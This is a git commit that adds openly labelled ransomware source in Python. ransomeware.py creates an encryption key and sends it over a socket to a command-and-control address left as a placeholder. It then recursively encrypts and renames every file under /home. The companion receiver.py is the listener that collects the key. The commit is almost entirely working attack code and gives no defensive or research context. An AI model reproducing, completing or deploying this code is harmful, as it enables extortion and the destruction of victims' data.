7fcb7ce24b582b36c1112749e2e430713b6aa94e
jh <jh@pepe-pew.pepepew.pew>
2026-03-17 02:21:14 -0700

    r5

---
+++ r5/ransomeware.py
@@ -0,0 +1,68 @@
+import os
+from cryptography.fernet import Fernet
+import socket
+
+def keygen():
+    key = Fernet.generate_key()
+    with open("keyfile.key", "wb") as keyfile:
+        keyfile.write(key)
+    print("key file generation successful")
+
+def send_data():
+    host = "127.0.0.1" # fill with cnc ip
+    port = 12345 # target port number here
+
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as clnt_sock:
+        try:
+            clnt_sock.connect((host, port))
+            print("connected")
+            try:
+                keygen()
+                with open("keyfile.key", "rb") as keyfile:
+                    key = keyfile.read(128)
+                if key:
+                    clnt_sock.sendall(key)
+                    print("key sent successful")
+            except FileNotFoundError:
+                print("key not found")
+                return 0
+        except ConnectionRefusedError:
+            print("connection refused")
+            return 0
+    return 1
+
+def encrypt_file(filepath):
+    with open(filepath, "rb") as file:
+        contents = file.read()
+    
+    # change keyfile location
+    with open("absolute path for the key file", "rb") as keyfile:
+        key = keyfile.read()
+    encrypted_contents = Fernet(key).encrypt(contents)
+
+    with open(filepath, "wb") as file:
+        file.write(encrypted_contents)
+
+def search_directories_from_root(root):
+    for test in os.listdir(root):
+            full_path = os.path.join(root, test)
+            
+            if test == "." or test == ".." or test == "keyfile.key" or test == "run.py" or test == "keyfile_generate.py" or test == "driver":
+                continue
+
+            if os.path.isfile(full_path):
+                encrypt_file(full_path)
+                renamed_file = full_path+".gp"
+                os.rename(full_path, renamed_file)
+            elif os.path.isdir(full_path):
+                search_directories_from_root(full_path)
+            else:
+                continue
+    
+def run():
+    if send_data():
+        search_directories_from_root("/home")
+
+
+if __name__ == "__main__":
+    run()
---
+++ r5/receiver.py
@@ -0,0 +1,24 @@
+import os
+import socket
+
+def receive_key():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as serv_sock:
+        port = 12345 # target port number here
+        host = '' # inaddr_any
+        serv_sock.bind((host, port))
+        serv_sock.listen(1)
+        conn,addr = serv_sock.accept()
+
+        with conn:
+            data = conn.recv(128)
+            if data:
+                print(f"received key: {data}")
+                with open("keyfile.key", "wb") as keyfile:
+                    keyfile.write(data)
+            else:
+                print("failed to receive keyfile")
+        
+
+if __name__ == "__main__":
+    receive_key()
+
